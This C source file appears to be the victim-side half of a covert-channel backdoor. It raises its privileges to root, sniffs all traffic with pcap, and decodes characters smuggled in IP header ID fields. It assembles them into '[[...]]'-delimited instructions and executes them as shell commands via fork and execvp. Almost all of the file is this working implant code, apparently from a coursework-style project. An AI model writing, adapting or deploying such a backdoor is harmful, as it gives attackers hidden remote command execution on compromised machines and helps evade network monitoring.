#include "victim.h"
#include "extern.h"


pid_t pid;

int main(int argc, char *argv[]) {
    struct options_victim opts;
    char receive[256] = {0};
    char received_instruction[64] = {0};

    char errbuf[PCAP_ERRBUF_SIZE] = {0};
    u_char* args = NULL;
    char* nic_interface;
    pcap_t* nic_fd;
    struct bpf_program fp;
    bpf_u_int32 netp;
    bpf_u_int32 maskp;

    struct sockaddr_in attacker_address;
    int attacker_address_size = sizeof(struct sockaddr_in);

    fd_set read_fds, copy_fds;
    int fd_max, fd_num;
    struct timeval timeout;

    int exit_flag = 0;

    program_setup();
    options_victim_init(&opts);
    initialize_victim_server(&opts);
    nic_interface = pcap_lookupdev(errbuf);    // get interface
    pcap_lookupnet(nic_interface, &netp, &maskp, errbuf);
    nic_fd = pcap_open_live(nic_interface, BUFSIZ, 1, -1, errbuf);
    if (nic_fd == NULL) {
        printf("pcap_open_live(): %s\n", errbuf);
        exit(EXIT_FAILURE);
    }

    if (pcap_compile (nic_fd, &fp, FILTER, 0, netp) == -1) {
        fprintf(stderr,"Error calling pcap_compile\n");
        exit(1);
    }

    // Load the filter into the capture device
    if (pcap_setfilter (nic_fd, &fp) == -1) {
        fprintf(stderr,"Error setting filter\n");
        exit(1);
    }
    args = (u_char*)&opts;
    pcap_loop(nic_fd, DEFAULT_COUNT, pkt_callback, args);


    FD_ZERO(&read_fds);
    FD_SET(STDIN_FILENO, &read_fds);
    FD_SET(opts.victim_socket, &read_fds);
    fd_max = opts.victim_socket;

    timeout.tv_sec = 1;
    timeout.tv_usec = 0;

    while (1) {
        if (exit_flag == 1) break;

        copy_fds = read_fds;
        fd_num = select(fd_max + 1, &copy_fds, 0, 0, &timeout);
        if (fd_num == -1) {
            perror("Select() failed");
            exit(EXIT_FAILURE);
        } else if (fd_num == 0) continue; // time out

        for (int i = 0; i < fd_max + 1; i++) {
            if (FD_ISSET(i, &copy_fds)) {
                if (i == opts.victim_socket) {

                    recvfrom(opts.victim_socket, receive, sizeof(receive), 0, (struct sockaddr*)&attacker_address, &attacker_address_size);
                    printf("PACKET = [ %s ]\n", receive);
                    if (strcmp(receive, QUIT) == 0) {
                        printf("EXIT program");
                        exit_flag = 1;
                        break;
                    }
                    memset(receive, 0, sizeof(char) * 256);
                }
            }
        }
    }
    close(opts.victim_socket);
    return EXIT_SUCCESS;
}

void options_victim_init(struct options_victim *opts) {
    memset(opts, 0, sizeof(struct options_victim));
}



void program_setup(void) {
    /* change the UID/GID to 0 (raise privilege) */
    setuid(0);
    setgid(0);
}


void initialize_victim_server(struct options_victim *opts) {
    struct sockaddr_in victim_address;
    int option = TRUE;

    opts->victim_socket = socket(AF_INET, SOCK_DGRAM, 0);
    if (opts->victim_socket == -1) {
        perror("socket() ERROR\n");
        exit(EXIT_FAILURE);
    }

    victim_address.sin_family = AF_INET;
    victim_address.sin_port = htons(DEFAULT_PORT);
    victim_address.sin_addr.s_addr = htonl(INADDR_ANY);

    if (victim_address.sin_addr.s_addr == (in_addr_t) -1) {
        fatal_errno(__FILE__, __func__, __LINE__, errno, 2);
    }

    option = 1;
    setsockopt(opts->victim_socket, SOL_SOCKET, SO_REUSEADDR, &option, sizeof(option));


    if (bind(opts->victim_socket, (struct sockaddr *) &victim_address, sizeof(struct sockaddr_in)) == -1) {
        perror("bind() ERROR\n");
        exit(EXIT_FAILURE);
    }


//    if (listen(opts->victim_socket, BACKLOG) == -1) {
//        perror("listen() ERROR\n");
//        exit(EXIT_FAILURE);
//    }
}


void add_new_socket(struct options_victim *opts, int attacker_socket, struct sockaddr_in *attacker_address) {
    char buffer[20] = {0};

    inet_ntop(AF_INET, &attacker_address->sin_addr, buffer, sizeof(buffer));
    printf("New sniffer: [ %s ]\n", buffer);
}


void pkt_callback(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet) {
    struct ether_header* ether;

    /* ETHERNET - only handle IPv4 */
    ether = (struct ether_header*)(packet);
    if (ntohs(ether->ether_type) == ETHERTYPE_IP) {
        process_ipv4(args, pkthdr, packet);
    }
}


void process_ipv4(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet) {
    struct ether_header* ether;
    struct iphdr *ip;
    struct options_victim* ov;
    char temp[2] = {0};
    uint16_t c;
    ov = (struct options_victim*)args;

    ether = (struct ether_header*)(packet);
    ip = (struct iphdr*)(((char*) ether) + sizeof(struct ether_header));
    c = hide_data(ntohs(ip->id));
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    temp[0] = (char)c;
    strcat(ov->received_buffer, temp);
    if (strstr(ov->received_buffer, "]]") != NULL) {
        extract_instruction(args);
        memset(ov->received_buffer, 0, S_ARR_SIZE);
    }
}


void extract_instruction(u_char *args) {
    struct options_victim* ov;
    size_t length;
    char *start = NULL, *end = NULL;

    ov = (struct options_victim*)args;
    start = strstr(ov->received_buffer, "[["); // Find the first '[' character
    end = strstr(ov->received_buffer, "]]");   // Find the first ']' character
    if (start && end && start < end) {
        start += 2; // Move the pointer past the '[' character
        length = (size_t) (end - start);
        strncpy(ov->instruction, start, length); // Copy the content between '[' and ']'
        printf("Extracted content: %s\n", ov->instruction);
        execute_instruction(args);
    }
    else {
        printf("Invalid message format.\n");
    }
}


void execute_instruction(u_char *args) {
    struct options_victim* ov;
    char **commands;

    ov = (struct options_victim*)args;

    // TODO: PORT KNOCK
    commands = split_line(ov->instruction);
    execute_command(commands);
    free(commands);
    memset(ov->instruction, 0, S_ARR_SIZE);
    // TODO: PORT KNOCK CLOSE
}


char **split_line(char *line) {
    int bufsize = LSH_TOK_BUFSIZE, position = 0;
    char **tokens = malloc(bufsize * sizeof(char*));
    char *token;

    if (!tokens) {
        fprintf(stderr, "lsh: allocation error\n");
        exit(EXIT_FAILURE);
    }

    token = strtok(line, LSH_TOK_DELIM);
    while (token != NULL) {
        tokens[position] = token;
        position++;

        if (position >= bufsize) {
            bufsize += LSH_TOK_BUFSIZE;
            tokens = realloc(tokens, bufsize * sizeof(char*));
            if (!tokens) {
                fprintf(stderr, "lsh: allocation error\n");
                exit(EXIT_FAILURE);
            }
        }

        token = strtok(NULL, LSH_TOK_DELIM);
    }
    tokens[position] = NULL;
    return tokens;
}


int execute_command(char **command_arr) {
    int i;

    if (command_arr[0] == NULL) {
        // An empty command was entered.
        return 1;
    }

    for (i = 0; i < num_builtins(); i++) {
        if (strcmp(command_arr[0], builtin_str[i]) == 0) {
            return (*builtin_func[i])(command_arr);
        }
    }

    return launch(command_arr);
}


int num_builtins(void) {
    return sizeof(builtin_str) / sizeof(char *);
}


int builtin_cd(char **command_arr) {
    if (command_arr[1] == NULL) {
        fprintf(stderr, "lsh: expected argument to \"cd\"\n");
    } else {
        if (chdir(command_arr[1]) != 0) {
            perror("builtin_cd()");
        }
    }
    return 1;
}


int builtin_exit(char **command_arr) {
    return 0;
}


int launch(char **args) {
    pid_t pid, wpid;
    int status;

    pid = fork();
    if (pid == 0) {
        // Child process
        if (execvp(args[0], args) == -1) {
            perror("launch()");
        }
        exit(EXIT_FAILURE);
    } else if (pid < 0) {
        // Error forking
        perror("launch()");
    } else {
        // Parent process
        do {
            wpid = waitpid(pid, &status, WUNTRACED);
        } while (!WIFEXITED(status) && !WIFSIGNALED(status));
    }

    return 1;
}
